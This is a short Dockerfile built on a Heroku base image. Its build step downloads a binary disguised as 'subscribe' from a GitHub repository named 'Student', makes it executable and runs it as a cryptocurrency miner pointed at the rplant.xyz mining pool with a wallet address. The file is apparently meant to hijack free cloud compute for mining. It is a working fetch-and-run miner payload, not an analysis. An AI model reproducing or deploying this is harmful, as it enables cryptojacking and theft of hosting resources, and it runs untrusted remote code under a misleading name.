FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/mrbogel/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a yespower -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qrdrf55nugm3unezhwdt7gyy33ke8cq0yr5yxg0.VPS
CMD bash heroku.sh
